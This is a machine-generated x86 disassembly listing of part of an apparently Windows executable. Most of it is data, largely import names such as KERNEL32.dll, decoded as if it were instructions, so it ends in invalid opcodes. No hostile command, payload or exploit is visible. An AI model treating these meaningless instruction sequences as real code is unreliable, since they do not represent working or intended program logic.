  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	ss inc ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
